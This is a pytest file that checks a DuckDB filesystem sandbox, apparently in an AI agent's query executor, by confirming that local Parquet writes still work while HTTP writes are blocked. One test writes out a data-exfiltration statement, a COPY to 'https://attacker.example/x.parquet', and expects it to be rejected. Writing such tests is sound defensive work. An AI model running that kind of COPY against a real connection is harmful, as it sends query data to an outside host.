"""DuckDB filesystem sandbox applied via ``open_and_attach``.

These pin the verified DuckDB 1.5.4 behaviour the sandbox relies on: an empty
``disabled_filesystems`` is a no-op, and disabling ``HTTPFileSystem`` blocks
``COPY … TO 'http(s)://…'`` exfiltration while leaving local materialization
(the result-Parquet write path) working.
"""

import duckdb
import pytest

from agent.executor.runner import _apply_fs_sandbox, open_and_attach


def test_empty_sandbox_is_a_noop(tmp_path):
    conn = open_and_attach(disabled_filesystems="")
    # Local writes (result materialization) must still work with no restriction.
    out = tmp_path / "ok.parquet"
    conn.execute(f"COPY (SELECT 1 AS n) TO '{out}' (FORMAT PARQUET)")
    assert out.exists()


def test_disabling_http_blocks_http_copy_but_not_local(tmp_path):
    conn = open_and_attach(disabled_filesystems="HTTPFileSystem")
    # Local COPY (how results are materialized) still works.
    out = tmp_path / "ok.parquet"
    conn.execute(f"COPY (SELECT 1 AS n) TO '{out}' (FORMAT PARQUET)")
    assert out.exists()
    # An http exfiltration destination is rejected by DuckDB.
    with pytest.raises(duckdb.Error):
        conn.execute(
            "COPY (SELECT 1 AS n) TO 'https://attacker.example/x.parquet' (FORMAT PARQUET)"
        )


def test_apply_fs_sandbox_accepts_multiple_and_bad_names(tmp_path):
    conn = duckdb.connect()
    # Comma/space separated list applies each filesystem (value is write-only in
    # DuckDB, so assert the functional effect: local writes are now blocked too).
    _apply_fs_sandbox(conn, "HTTPFileSystem, LocalFileSystem")
    with pytest.raises(duckdb.Error):
        conn.execute(f"COPY (SELECT 1 AS n) TO '{tmp_path / 'x.parquet'}' (FORMAT PARQUET)")
    # None / whitespace-only is a no-op and never raises.
    _apply_fs_sandbox(duckdb.connect(), None)
    _apply_fs_sandbox(duckdb.connect(), "   ")
